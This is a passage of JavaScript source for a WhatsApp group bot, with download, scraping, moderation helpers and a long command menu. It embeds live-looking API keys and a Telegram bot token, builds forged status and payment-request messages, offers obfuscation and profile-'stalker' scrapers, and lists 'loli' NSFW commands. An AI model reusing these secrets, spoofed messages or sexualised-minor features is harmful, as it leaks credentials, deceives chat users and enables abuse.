	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./assets/theme/TsunadeBot-1.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await TsunadeBot.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await TsunadeBot.getName(i)}\nFN:${await TsunadeBot.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let mznkingrecordin = ['recording','composing']
//let mznkingrecordinfinal = mznkingrecordin[Math.floor(Math.random() * mznkingrecordin.length)]



const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./lib/scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await TsunadeBot.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await TsunadeBot.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./lib/scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await TsunadeBot.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await TsunadeBot.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
TsunadeBot.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcmznking('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const mznkingzresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'mznking',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            mznkingzresult.push(result)
        }
    resolve(mznkingzresult)
    })
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await TsunadeBot.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await TsunadeBot.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return MznKingBotAdminReply()
        let gclink = (`https://chat.whatsapp.com/`+await TsunadeBot.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.chat)
        if (isgclink) return TsunadeBot.sendMessage(m.chat, {text: `*⛔ Link sharing is forbidden by group admins.*`})
        if (isAdmins) return console.log(`[ ADMIN ] Sent group link in antilink group.`);
        if (MznKingTheCreator) return console.log(`[ OWNER ] Sent group link in antilink group.`);
        kice = m.sender
        await TsunadeBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			TsunadeBot.sendMessage(from, {text:`*⛔ Link sharing is forbidden by group admins.*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

//antivirtex by mznking
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return MznKingBotAdminReply()
          await TsunadeBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			TsunadeBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			TsunadeBot.sendMessage(from, {text:`*⛔ Virus sharing is forbidden by group admins.*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by mznking
if (antiToxic){
for (let bak of BadMznKing) {
if (budy === bak) {
TsunadeBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
TsunadeBot.sendMessage(from, {text:`*⛔ Bad words are forbidden by bot owners.*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

// Commands List.
const me = m.sender;
const timestampe = speed();
const latensie = speed() - timestampe;

const allmenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Menu List* 🧚 』───
│
│ ≡ .allmenu
│ ≡ .mainmenu
│ ≡ .downloadmenu
│ ≡ .funmenu
│ ≡ .aimenu
│ ≡ .groupmenu
│ ≡ .ownermenu
│ ≡ .textlogomenu
│ ≡ .animemenu
│ ≡ .nsfwmenu
│ ≡ .randommenu
│ ≡ .stickermenu
│ ≡ .databasemenu
│ ≡ .stalkermenu
│ ≡ .banmenu
│
╰──────────

╭───『 🧚 *Main Menu * 🧚 』───
│
│ ≡ .ping 
│ ≡ .menu 
│ ≡ .myip 
│ ≡ .report 
│ ≡ .listpem 
│ ≡ .liststicker 
│ ≡ .listimage 
│ ≡ .listvideo 
│ ≡ .listvn 
│ ≡ .listapk 
│ ≡ .listzip 
│ ≡ .listpdf 
│ ≡ .listbadword 
│ ≡ .listpc 
│ ≡ .listgc 
│ ≡ .idgroup 
│ ≡ .owner 
│ ≡ .rentbot 
│ ≡ .listrentbot 
│ ≡ .donate 
│ ≡ .friend 
│ ≡ .obfuscate 
│ ≡ .styletext 
│ ≡ .fliptext 
│ ≡ .tts 
│ ≡ .say 
│ ≡ .togif 
│ ≡ .toqr 
│ ≡ .bass 
│ ≡ .blown 
│ ≡ .deep 
│ ≡ .earrape 
│ ≡ .fast 
│ ≡ .fat 
│ ≡ .nightcore 
│ ≡ .reverse 
│ ≡ .robot 
│ ≡ .slow 
│ ≡ .smooth 
│ ≡ .squirrel 
│ ≡ .tinyurl 
│ ≡ .tinyurl 
│ ≡ .tovn 
│ ≡ .toaudio 
│ ≡ .tomp3 
│ ≡ .tomp4
│ ≡ .toimg 
│ ≡ .toonce 
│ ≡ .sticker 
│ ≡ .take 
│ ≡ .emoji 
│ ≡ .volume 
│ ≡ .ebinary 
│ ≡ .dbinary 
│ ≡ .ssweb 
│ ≡ .quoted 
│ ≡ .runtime 
│
╰──────────

╭───『 🧚 *Owner* 🧚 』───
│
│ ≡ .self 
│ ≡ .public 
│ ≡ .join 
│ ≡ .bctext 
│ ≡ .poll 
│ ≡ .bcimage 
│ ≡ .bcvideo 
│ ≡ .creategc 
│ ≡ .setexif 
│ ≡ .userjid 
│ ≡ .setbotname 
│ ≡ .setbotbio 
│ ≡ .delppbot 
│ ≡ .shutdown 
│ ≡ .setppbot 
│ ≡ .addowner 
│ ≡ .delowner
│ ≡ .upswtext 
│ ≡ .upswvideo 
│ ≡ .upswimage 
│ ≡ .upswaudio 
│ ≡ .block 
│ ≡ .unblock del 
│ ≡ .leavegc 
│ ≡ .pushcontact 
│ ≡ .pushcontactv2 
│
╰──────────

╭───『 🧚 *Group* 🧚 』───
│
│ ≡ .Antilink 
│ ≡ .antiwame 
│ ≡ .grouplink 
│ ≡ .invite 
│ ≡ .ephemeral 
│ ≡ .delete 
│ ≡ .setppgroup 
│ ≡ .delppgroup 
│ ≡ .setname 
│ ≡ .setdesc 
│ ≡ .add 
│ ≡ .kick 
│ ≡ .promote 
│ ≡ .demote 
│ ≡ .getcontact 
│ ≡ .savecontact 
│ ≡ .sendcontact 
│ ≡ .contactag 
│ ≡ .hidetag 
│ ≡ .totag 
│ ≡ .tagall 
│ ≡ .editinfo 
│ ≡ .unmutetime 
│ ≡ .mutetime 
│ ≡ .resetlink 
│ ≡ .getbio 
│ ≡ .vote 
│ ≡ .upvote 
│ ≡ .downvote 
│ ≡ .checkvote 
│ ≡ .delvote 
│ ≡ .autostickergc 
│ ≡ .Antilinkgc 
│ ≡ .antiwame 
│ ≡ .Antilink
│ ≡ .antivirus 
│ ≡ .antitoxic 
│ ≡ .nsfw 
│ ≡ .react 
│
╰──────────

╭───『 🧚 *Downloader* 🧚 』───
│
│ ≡ .ytsearch 
│ ≡ .play 
│ ≡ .ytmp3 
│ ≡ .ytmp4 
│ ≡ .tiktokaudio 
│ ≡ .tiktok 
│ ≡ .igvideo 
│ ≡ .igimage 
│ ≡ .apk 
│ ≡ .google 
│ ≡ .imdb 
│ ≡ .weather 
│ ≡ .wanumber 
│ ≡ .spotify 
│ ≡ .gitclone 
│ ≡ .happymod 
│ ≡ .gdrive 
│ ≡ .pinterest 
│ ≡ .ringtone 
│
╰──────────

╭───『 🧚 *Random* 🧚 』───
│
│ ≡ .tiktokgirl 
│ ≡ .tiktoknukthy 
│ ≡ .tiktokkayes 
│ ≡ .tiktokpanrika 
│ ≡ .tiktoknotnot 
│ ≡ .tiktokghea 
│ ≡ .tiktoksantuy 
│ ≡ .tiktokbocil
│ ≡ .aesthetic 
│ ≡ .coffee 
│ ≡ .wikimedia 
│ ≡ .wallpaper 
│ ≡ .art 
│ ≡ .bts 
│ ≡ .dogwoof 
│ ≡ .catmeow 
│ ≡ .lizardpic 
│ ≡ .goosebird 
│ ≡ .8ballpool 
│ ≡ .cosplay 
│ ≡ .hacker 
│ ≡ .cyber 
│ ≡ .gamewallpaper 
│ ≡ .islamic 
│ ≡ .jennie 
│ ≡ .jiso 
│ ≡ .satanic 
│ ≡ .justina 
│ ≡ .cartoon 
│ ≡ .pentol 
│ ≡ .cat 
│ ≡ .kpop 
│ ≡ .exo 
│ ≡ .lisa 
│ ≡ .space 
│ ≡ .car 
│ ≡ .technology 
│ ≡ .bike 
│ ≡ .shortquote 
│ ≡ .antiwork 
│ ≡ .hacking 
│ ≡ .boneka 
│ ≡ .rose 
│ ≡ .ryujin 
│ ≡ .ulzzangboy 
│ ≡ .ulzzanggirl 
│ ≡ .wallml 
│ ≡ .wallphone 
│ ≡ .mountain 
│ ≡ .goose 
│ ≡ .profilepic 
│ ≡ .couplepp 
│ ≡ .programming 
│ ≡ .pubg 
│ ≡ .blackpink 
│ ≡ .randomboy   
│ ≡ .randomgirl 
│ ≡ .hijab   
│ ≡ .chinese 
│ ≡ .indo 
│ ≡ .japanese 
│ ≡ .korean 
│ ≡ .malay 
│ ≡ .thai 
│ ≡ .vietnamese 
│
╰──────────

╭───『 🧚 *Stalker* 🧚 』───
│
│ ≡ .igstalk 
│ ≡ .ffstalk 
│ ≡ .mlstalk 
│ ≡ .npmstalk 
│ ≡ .ghstalk 
│
╰──────────

╭───『 🧚 *AI* 🧚 』───
│
│ ≡ .openai 
│ ≡ .ai 
│ ≡ .mathsai 
│ ≡ .remini
│ ≡ .blackbox
│
╰──────────

╭───『 🧚 *Entertainment* 🧚 』───
│
│ ≡ .define 
│ ≡ .qc 
│ ≡ .lyrics 
│ ≡ .suit 
│ ≡ .math 
│ ≡ .tictactoe 
│ ≡ .fact 
│ ≡ .truth 
│ ≡ .dare 
│ ≡ .couple 
│ ≡ .soulmate 
│ ≡ .stupidcheck 
│ ≡ .handsomecheck 
│ ≡ .uncleancheck 
│ ≡ .hotcheck 
│ ≡ .smartcheck 
│ ≡ .greatcheck 
│ ≡ .evilcheck 
│ ≡ .dogcheck 
│ ≡ .coolcheck 
│ ≡ .waifucheck 
│ ≡ .awesomecheck 
│ ≡ .gaycheck 
│ ≡ .cutecheck 
│ ≡ .lesbiancheck 
│ ≡ .hornycheck 
│ ≡ .prettycheck 
│ ≡ .lovelycheck 
│ ≡ .uglycheck 
│ ≡ .pick 
│ ≡ .quotes 
│ ≡ .can 
│ ≡ .is 
│ ≡ .when 
│ ≡ .where 
│ ≡ .what 
│ ≡ .how 
│ ≡ .rate 
│ ≡ .cry 
│ ≡ .kill 
│ ≡ .hug 
│ ≡ .pat 
│ ≡ .lick  
│ ≡ .kiss 
│ ≡ .bite 
│ ≡ .yeet 
│ ≡ .bully 
│ ≡ .bonk 
│ ≡ .wink 
│ ≡ .poke 
│ ≡ .nom 
│ ≡ .slap 
│ ≡ .smile  
│ ≡ .wave 
│ ≡ .awoo 
│ ≡ .blush 
│ ≡ .smug 
│ ≡ .glomp  
│ ≡ .happy 
│ ≡ .dance 
│ ≡ .cringe 
│ ≡ .cuddle 
│ ≡ .highfive  
│ ≡ .shinobu 
│ ≡ .handhold 
│ ≡ .spank 
│ ≡ .tickle 
│ ≡ .avatar 
│ ≡ .feed 
│ ≡ .foxgirl 
│ ≡ .gecg 
│ ≡ .checkme 
│ ≡ .sound1 - sound161 
│
╰──────────

╭───『 🧚 *WA Stickers* 🧚 』───
│
│ ≡ .goose 
│ ≡ .woof 
│ ≡ .8ball 
│ ≡ .lizard 
│ ≡ .meow 
│ ≡ .gura 
│ ≡ .doge 
│ ≡ .patrick 
│ ≡ .lovestick 
│ ≡ .telestick 
│
╰──────────

╭───『 🧚 *Anime* 🧚 』───
│
│ ≡ .akira 
│ ≡ .akiyama 
│ ≡ .ana 
│ ≡ .asuna 
│ ≡ .ayuzawa 
│ ≡ .boruto 
│ ≡ .chiho 
│ ≡ .chitoge 
│ ≡ .cosplayloli 
│ ≡ .cosplaysagiri 
│ ≡ .deidara 
│ ≡ .doraemon 
│ ≡ .elaina 
│ ≡ .emilia 
│ ≡ .erza 
│ ≡ .gremory 
│ ≡ .hestia 
│ ≡ .husbu 
│ ≡ .inori 
│ ≡ .isuzu 
│ ≡ .itachi 
│ ≡ .itori 
│ ≡ .kaga 
│ ≡ .kagura 
│ ≡ .kakasih 
│ ≡ .kaori 
│ ≡ .keneki 
│ ≡ .kotori 
│ ≡ .kurumi 
│ ≡ .loli 
│ ≡ .madara 
│ ≡ .megumin 
│ ≡ .mikasa 
│ ≡ .mikey 
│ ≡ .miku 
│ ≡ .minato 
│ ≡ .naruto 
│ ≡ .neko 
│ ≡ .neko2 
│ ≡ .nekonime 
│ ≡ .nezuko 
│ ≡ .onepiece 
│ ≡ .pokemon 
│ ≡ .randomnime 
│ ≡ .randomnime2 
│ ≡ .rize 
│ ≡ .sagiri 
│ ≡ .sakura 
│ ≡ .sasuke 
│ ≡ .shina 
│ ≡ .shinka 
│ ≡ .shinomiya 
│ ≡ .shizuka 
│ ≡ .shota 
│ ≡ .tejina 
│ ≡ .toukachan 
│ ≡ .tsunade 
│ ≡ .waifu 
│ ≡ .animewall 
│ ≡ .yotsuba 
│ ≡ .yuki 
│ ≡ .yulibocil 
│ ≡ .yumeko 
│ ≡ .8ball 
│ ≡ .tickle 
│ ≡ .gecg 
│ ≡ .feed 
│ ≡ .animeawoo 
│ ≡ .animemegumin 
│ ≡ .animeshinobu 
│ ≡ .animehandhold 
│ ≡ .animehighfive 
│ ≡ .animecringe 
│ ≡ .animedance 
│ ≡ .animehappy 
│ ≡ .animeglomp 
│ ≡ .animeblush 
│ ≡ .animesmug 
│ ≡ .animewave 
│ ≡ .animesmille 
│ ≡ .animepoke 
│ ≡ .animewink 
│ ≡ .animebonk 
│ ≡ .animebully 
│ ≡ .animeyeet 
│ ≡ .animebite 
│ ≡ .animelick 
│ ≡ .animekill 
│ ≡ .animecry 
│ ≡ .animewlp 
│ ≡ .animekiss 
│ ≡ .animehug 
│ ≡ .animeneko 
│ ≡ .animepat 
│ ≡ .animeslap 
│ ≡ .animecuddle 
│ ≡ .animewaifu 
│ ≡ .animenom 
│ ≡ .animefoxgirl 
│ ≡ .animegecg 
│ ≡ .animetickle 
│ ≡ .animefeed 
│ ≡ .animeavatar 
│ ≡ .genshin 
│ ≡ .anime 
│
╰──────────

╭───『 🧚 *NSFW* 🧚 』───
│
│ ≡ .hentai 
│ ≡ .gifhentai 
│ ≡ .gifblowjob 
│ ≡ .hentaivid 
│ ≡ .hneko 
│ ≡ .nwaifu 
│ ≡ .animespank 
│ ≡ .trap 
│ ≡ .gasm 
│ ≡ .ahegao 
│ ≡ .ass 
│ ≡ .bdsm 
│ ≡ .blowjob 
│ ≡ .cuckold 
│ ≡ .cum 
│ ≡ .milf 
│ ≡ .eba 
│ ≡ .ero 
│ ≡ .femdom 
│ ≡ .foot 
│ ≡ .gangbang 
│ ≡ .glasses 
│ ≡ .jahy 
│ ≡ .masturbation 
│ ≡ .manga 
│ ≡ .neko-hentai 
│ ≡ .neko-hentai2 
│ ≡ .nsfwloli 
│ ≡ .orgy 
│ ≡ .panties  
│ ≡ .pussy 
│ ≡ .tentacles 
│ ≡ .thighs 
│ ≡ .yuri 
│ ≡ .zettai 
│
╰──────────

╭───『 🧚 *Text Logo* 🧚 』───
│
│ ≡ .shadow  
│ ≡ .write  
│ ≡ .romantic  
│ ≡ .burnpaper 
│ ≡ .smoke  
│ ≡ .narutobanner  
│ ≡ .love  
│ ≡ .undergrass 
│ ≡ .doublelove  
│ ≡ .coffecup 
│ ≡ .underwaterocean 
│ ≡ .smokyneon 
│ ≡ .starstext 
│ ≡ .rainboweffect 
│ ≡ .balloontext 
│ ≡ .metalliceffect 
│ ≡ .embroiderytext 
│ ≡ .flamingtext 
│ ≡ .stonetext 
│ ≡ .writeart 
│ ≡ .summertext 
│ ≡ .wolfmetaltext 
│ ≡ .nature3dtext 
│ ≡ .rosestext 
│ ≡ .naturetypography 
│ ≡ .quotesunder 
│ ≡ .shinetext 
│ ≡ .glitchtext 
│ ≡ .writetext 
│ ≡ .advancedglow 
│ ≡ .typographytext 
│ ≡ .pixelglitch 
│ ≡ .neonglitch 
│ ≡ .flagtext 
│ ≡ .flag3dtext 
│ ≡ .deletingtext 
│ ≡ .blackpinkstyle 
│ ≡ .glowingtext 
│ ≡ .underwatertext 
│ ≡ .logomaker 
│ ≡ .cartoonstyle 
│ ≡ .papercutstyle 
│ ≡ .watercolortext 
│ ≡ .effectclouds 
│ ≡ .blackpinklogo 
│ ≡ .gradienttext 
│ ≡ .summerbeach 
│ ≡ .luxurygold 
│ ≡ .multicoloredneon 
│ ≡ .sandsummer 
│ ≡ .galaxywallpaper 
│ ≡ .1917style 
│ ≡ .makingneon 
